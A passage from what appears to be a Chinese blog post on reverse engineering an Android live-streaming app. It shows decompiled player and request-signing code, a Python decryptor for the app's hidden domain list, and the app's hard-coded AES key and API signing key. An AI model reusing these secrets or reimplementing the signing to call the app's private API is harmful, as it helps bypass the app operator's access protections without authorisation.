class="number">1</span>]</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="keyword">return</span> plain</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decodedomain</span>(<span class="params">self, encdata</span>):</span><br><span class="line">        key = <span class="string">b&#x27;WTSecret81234512&#x27;</span></span><br><span class="line">        iv = <span class="string">b&#x27;16-Bytes--String&#x27;</span></span><br><span class="line">        cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">        bencdata = b64decode(<span class="built_in">bytes</span>(encdata, <span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">        rsadata = cipher.decrypt(bencdata)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pridomain.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pri = f.read()</span><br><span class="line">            rsadomain = rsadata.split(<span class="string">b&#x27;|&#x27;</span>)</span><br><span class="line">            rsadomainlist = []</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rsadomain)):</span><br><span class="line">                rsadomainlist += rsadomain[i].split(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">            domainlist = []</span><br><span class="line">            <span class="keyword">for</span> encdom <span class="keyword">in</span> rsadomainlist:</span><br><span class="line">                encditem = b64decode(encdom.strip(<span class="string">b&#x27;\n&#x27;</span>))</span><br><span class="line">                domainlist.append(self.decrsa(pri, encditem).decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="keyword">return</span> domainlist</span><br><span class="line"> </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decoderesponce</span>(<span class="params">responcebytes</span>):</span><br><span class="line">        encresponce = responcebytes.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        responce = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">list</span>(encresponce):</span><br><span class="line">            responce += <span class="built_in">chr</span>(<span class="built_in">ord</span>(e) ^ <span class="number">12029</span>).encode(<span class="string">&#x27;utf8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> responce.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="IjkMediaPlayer"><a href="#IjkMediaPlayer" class="headerlink" title="IjkMediaPlayer"></a>IjkMediaPlayer</h3><p>从两天前着手的时候就对这部分充满兴趣，最开始我以为可能只是修改了一下<code>.flv</code>的参数，导致视频解析出了问题，<br>没想到结果出乎意料啊！竟然用到了<code>NDK</code>需要反编译<code>.so</code>文件。暂时还不能掌握这门技术，慢慢搞吧。<br>下面先说一下，定位代码位置的过程吧。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainTabActivity</span> <span class="keyword">extends</span> <span class="title class_">BaseActivity</span> <span class="keyword">implements</span> <span class="title class_">ResponseObserver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">selectTab</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="type">Fragment</span> <span class="variable">fragment</span> <span class="operator">=</span> <span class="built_in">this</span>.liveTabFragment;</span><br><span class="line">            <span class="keyword">if</span> (fragment == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.liveTabFragment = LiveHomeFragment.newInstance();</span><br><span class="line">                beginTransaction.add(<span class="number">2131296852</span>, <span class="built_in">this</span>.liveTabFragment);</span><br><span class="line">                TomatoLiveSDKUtils.getSingleton().updateServerUrl();</span><br><span class="line">                TomatoLiveSDKUtils.getSingleton().initAnim();</span><br><span class="line">                TomatoLiveSDKUtils.getSingleton().loadOperationActivityDialog(<span class="built_in">this</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                beginTransaction.show(fragment);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用了<code>LiveHomeFragment</code>，并且看起来是用于交互了，看一下这个类。<br>这个类非常长，里面用众多方法，因为mvp导致的，仔细观察！发现很多个关于<code>play</code>的方法！<br>感觉其中一定有点搞头，观察其中一个方法，应该是在从<code>rtmp</code>换到<code>flv</code>的时候使用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LiveHomeFragment</span> <span class="keyword">extends</span> <span class="title class_">BaseFragment</span>&lt;HomePresenter&gt; <span class="keyword">implements</span> <span class="title class_">IHomeView</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">switchStream</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!isLiving()) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isRTCStream) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isVoiceRoomType()) &#123;</span><br><span class="line">                stopRTC();</span><br><span class="line">                initSeatData();</span><br><span class="line">                updateYYLinkIconView(<span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            showLiveLoadingView(<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        startPullTimeOut();</span><br><span class="line">        <span class="keyword">if</span> (isVideoRoomType()) &#123;</span><br><span class="line">            showLoadingAnim();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">PlayManager</span> <span class="variable">playManager2</span> <span class="operator">=</span> <span class="built_in">this</span>.playManager;</span><br><span class="line">        <span class="keyword">if</span> (playManager2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            playManager2.switchStream(<span class="built_in">this</span>.pullStreamUrl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他的名字带有<code>play</code>的方法很类似地都提到了一个<code>PlayManager</code>的类，这应该是控制整个播放流程的关键类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PlayManager</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initIjkVideoView</span><span class="params">()</span> &#123;</span><br><span class="line">        Observable.just(<span class="literal">true</span>).observeOn(Schedulers.io()).subscribeOn(Schedulers.io()).subscribe(<span class="keyword">new</span> <span class="title class_">Consumer</span>&lt;Boolean&gt;() &#123;</span><br><span class="line">            <span class="comment">/* class com.tomatolive.library.utils.live.PlayManager.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">accept</span><span class="params">(Boolean bool)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    IjkMediaPlayer.loadLibrariesOnce(<span class="literal">null</span>);</span><br><span class="line">                    IjkMediaPlayer.native_profileBegin(<span class="string">&quot;libfqplayer.so&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">this</span>.mIjkplayerView = <span class="keyword">new</span> <span class="title class_">IjkVideoView</span>(<span class="built_in">this</span>.mContext);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.isFromRecyclerView) &#123;</span><br><span class="line">            <span class="built_in">this</span>.mIjkplayerView.setMute(<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">checkPlayUrl</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (str.startsWith(<span class="string">&quot;rtmp://&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.mPlayType = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((str.startsWith(<span class="string">&quot;http://&quot;</span>) || str.startsWith(<span class="string">&quot;https://&quot;</span>)) &amp;&amp; str.contains(<span class="string">&quot;.flv&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.mPlayType = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((str.startsWith(<span class="string">&quot;http://&quot;</span>) || str.startsWith(<span class="string">&quot;https://&quot;</span>)) &amp;&amp; str.contains(<span class="string">&quot;.m3u8&quot;</span>)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.mPlayType = <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startPlayWithListener</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        checkPlayUrl(str);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isEnableVideoStreamEncode) &#123;</span><br><span class="line">            <span class="type">IjkVideoView</span> <span class="variable">ijkVideoView</span> <span class="operator">=</span> <span class="built_in">this</span>.mIjkplayerView;</span><br><span class="line">            <span class="keyword">if</span> (ijkVideoView != <span class="literal">null</span>) &#123;</span><br><span class="line">                ijkVideoView.setOnPlayStateListener(<span class="built_in">this</span>.onPlayStateListener);</span><br><span class="line">                <span class="built_in">this</span>.mIjkplayerView.setVideoPath(str);</span><br><span class="line">                <span class="built_in">this</span>.mIjkplayerView.start();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TXLivePlayer</span> <span class="variable">tXLivePlayer</span> <span class="operator">=</span> <span class="built_in">this</span>.mLivePlayer;</span><br><span class="line">        <span class="keyword">if</span> (tXLivePlayer != <span class="literal">null</span>) &#123;</span><br><span class="line">            tXLivePlayer.setPlayListener(<span class="built_in">this</span>.playListener);</span><br><span class="line">            <span class="built_in">this</span>.mLivePlayer.startPlay(str, <span class="built_in">this</span>.mPlayType);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个类与<code>IjkVideoView</code>和<code>IjkMediaPlayer</code>紧密的关系在一起，是Ijk播放器的控制类。<br>下面观察一下这两个Ijk播放器的类，在这里面将.so导入，使用native直接调用等操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IjkVideoView</span> <span class="keyword">extends</span> <span class="title class_">FrameLayout</span> <span class="keyword">implements</span> <span class="title class_">MediaController</span>.MediaPlayerControl &#123;</span><br><span class="line">    <span class="meta">@TargetApi(23)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">openVideo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.mUri != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.mSurfaceHolder != <span class="literal">null</span>) &#123;</span><br><span class="line">            release(<span class="literal">false</span>);</span><br><span class="line">            ((AudioManager) <span class="built_in">this</span>.mAppContext.getSystemService(<span class="string">&quot;audio&quot;</span>)).requestAudioFocus(<span class="literal">null</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.mMediaPlayer = createPlayer();</span><br><span class="line">                getContext();</span><br><span class="line">                <span class="built_in">this</span>.mMediaPlayer.setOnPreparedListener(<span class="built_in">this</span>.mPreparedListener);</span><br><span class="line">                <span class="built_in">this</span>.mMediaPlayer.setOnVideoSizeChangedListener(<span class="built_in">this</span>.mSizeChangedListener);</span><br><span class="line">                <span class="built_in">this</span>.mMediaPlayer.setOnCompletionListener(<span class="built_in">this</span>.mCompletionListener);</span><br><span class="line">                <span class="built_in">this</span>.mMediaPlayer.setOnErrorListener(<span class="built_in">this</span>.mErrorListener);</span><br><span class="line">                <span class="built_in">this</span>.mMediaPlayer.setOnInfoListener(<span class="built_in">this</span>.mInfoListener);</span><br><span class="line">                <span class="built_in">this</span>.mMediaPlayer.setOnBufferingUpdateListener(<span class="built_in">this</span>.mBufferingUpdateListener);</span><br><span class="line">                <span class="built_in">this</span>.mMediaPlayer.setOnSeekCompleteListener(<span class="built_in">this</span>.mSeekCompleteListener);</span><br><span class="line">                <span class="built_in">this</span>.mMediaPlayer.setOnTimedTextListener(<span class="built_in">this</span>.mOnTimedTextListener);</span><br><span class="line">                <span class="built_in">this</span>.mCurrentBufferPercentage = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">this</span>.mUri.getScheme();</span><br><span class="line">                <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">14</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.mMediaPlayer.setDataSource(<span class="built_in">this</span>.mAppContext, <span class="built_in">this</span>.mUri, <span class="built_in">this</span>.mHeaders);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">this</span>.mMediaPlayer.setDataSource(<span class="built_in">this</span>.mUri.toString());</span><br><span class="line">                &#125;</span><br><span class="line">                bindSurfaceHolder(<span class="built_in">this</span>.mMediaPlayer, <span class="built_in">this</span>.mSurfaceHolder);</span><br><span class="line">                <span class="built_in">this</span>.mMediaPlayer.setAudioStreamType(<span class="number">3</span>);</span><br><span class="line">                <span class="built_in">this</span>.mMediaPlayer.setScreenOnWhilePlaying(<span class="literal">true</span>);</span><br><span class="line">                <span class="built_in">this</span>.mPrepareStartTime = System.currentTimeMillis();</span><br><span class="line">                <span class="built_in">this</span>.mMediaPlayer.prepareAsync();</span><br><span class="line">                setMute(<span class="built_in">this</span>.mMuted);</span><br><span class="line">                <span class="built_in">this</span>.mCurrentState = <span class="number">1</span>;</span><br><span class="line">                attachMediaController();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="built_in">this</span>.TAG;</span><br><span class="line">                Log.w(str, <span class="string">&quot;Unable to open content: &quot;</span> + <span class="built_in">this</span>.mUri, e);</span><br><span class="line">                <span class="built_in">this</span>.mCurrentState = -<span class="number">1</span>;</span><br><span class="line">                <span class="built_in">this</span>.mTargetState = -<span class="number">1</span>;</span><br><span class="line">                <span class="built_in">this</span>.mErrorListener.onError(<span class="built_in">this</span>.mMediaPlayer, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalArgumentException e2) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="built_in">this</span>.TAG;</span><br><span class="line">                Log.w(str2, <span class="string">&quot;Unable to open content: &quot;</span> + <span class="built_in">this</span>.mUri, e2);</span><br><span class="line">                <span class="built_in">this</span>.mCurrentState = -<span class="number">1</span>;</span><br><span class="line">                <span class="built_in">this</span>.mTargetState = -<span class="number">1</span>;</span><br><span class="line">                <span class="built_in">this</span>.mErrorListener.onError(<span class="built_in">this</span>.mMediaPlayer, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">IjkMediaPlayer</span> <span class="keyword">extends</span> <span class="title class_">AbstractMediaPlayer</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">loadLibrariesOnce</span><span class="params">(IjkLibLoader ijkLibLoader)</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (IjkMediaPlayer.class) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!mIsLibLoaded) &#123;</span><br><span class="line">                <span class="keyword">if</span> (ijkLibLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">                    ijkLibLoader = sLocalLibLoader;</span><br><span class="line">                &#125;</span><br><span class="line">                ijkLibLoader.loadLibrary(<span class="string">&quot;fqffmpeg&quot;</span>);</span><br><span class="line">                ijkLibLoader.loadLibrary(<span class="string">&quot;fqsdl&quot;</span>);</span><br><span class="line">                ijkLibLoader.loadLibrary(<span class="string">&quot;fqplayer&quot;</span>);</span><br><span class="line">                mIsLibLoaded = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initPlayer</span><span class="params">(IjkLibLoader ijkLibLoader)</span> &#123;</span><br><span class="line">        loadLibrariesOnce(ijkLibLoader);</span><br><span class="line">        initNativeOnce();</span><br><span class="line">        <span class="type">Looper</span> <span class="variable">myLooper</span> <span class="operator">=</span> Looper.myLooper();</span><br><span class="line">        <span class="keyword">if</span> (myLooper != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.mEventHandler = <span class="keyword">new</span> <span class="title class_">EventHandler</span>(<span class="built_in">this</span>, myLooper);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Looper</span> <span class="variable">mainLooper</span> <span class="operator">=</span> Looper.getMainLooper();</span><br><span class="line">            <span class="keyword">if</span> (mainLooper != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.mEventHandler = <span class="keyword">new</span> <span class="title class_">EventHandler</span>(<span class="built_in">this</span>, mainLooper);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.mEventHandler = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        native_setup(<span class="keyword">new</span> <span class="title class_">WeakReference</span>(<span class="built_in">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getVideoDecoder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>) _getPropertyLong(<span class="number">20003</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好了，目前只能到此为止了，最后这三个重要的类以及三个<code>.so</code>就是目前的所有线索。稍微准备点预备知识再追。</p><h2 id="请求参数"><a href="#请求参数" class="headerlink" title="请求参数"></a>请求参数</h2><p>这是一块比较枯燥的内容，搞过一次，大概费了一天的时间，后来让我给忘记了，妹的，以后如果能搞定 .so 一定回来补上这一节。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">signRequest</span><span class="params">(Request request, TreeMap&lt;String, Object&gt; treeMap, String str)</span> &#123;</span><br><span class="line"><span class="type">TreeMap</span> <span class="variable">treeMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeMap</span>($$Lambda$TEfSBt3hRUlBSSARfPEHsJesTtE.INSTANCE);</span><br><span class="line">treeMap2.putAll(treeMap);</span><br><span class="line">treeMap2.put(AddHeaderInterceptor.TIME_STAMP_STR, request.header(AddHeaderInterceptor.TIME_STAMP_STR));</span><br><span class="line">treeMap2.put(AddHeaderInterceptor.RANDOM_STR, request.header(AddHeaderInterceptor.RANDOM_STR));</span><br><span class="line">treeMap2.put(<span class="string">&quot;deviceId&quot;</span>, request.header(<span class="string">&quot;deviceId&quot;</span>));</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"><span class="keyword">for</span> (Map.Entry entry : treeMap2.entrySet()) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> (String) entry.getKey();</span><br><span class="line"><span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line"><span class="keyword">if</span> (!TextUtils.equals(RequestParams.PAGE_SIZE, str2) &amp;&amp; !TextUtils.equals(RequestParams.PAGE_NUMBER, str2) &amp;&amp; value != <span class="literal">null</span>) &#123;</span><br><span class="line">sb.append(str2);</span><br><span class="line">sb.append(SimpleComparison.EQUAL_TO_OPERATION);</span><br><span class="line">sb.append(value);</span><br><span class="line">sb.append(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (sb.indexOf(<span class="string">&quot;&amp;&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">sb.deleteCharAt(sb.lastIndexOf(<span class="string">&quot;&amp;&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> MD5Utils.hash(TomatoLiveSDK.getSingleton().SIGN_API_KEY + <span class="string">&quot;_&quot;</span> + sb.toString().toUpperCase());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中传入的参数 <code>treeMap</code> 是请求体， <code>SIGN_API_KEY</code> 是一个固定的字符串 <code>8zy8nbs9lyddx02slcz8ypmwcr2tlu72</code></p><h3 id="请求实现"><a href="#请求实现" class="headerlink" title="请求实现"></a>请求实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> Appdec <span class="keyword">import</span> Appdec</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span 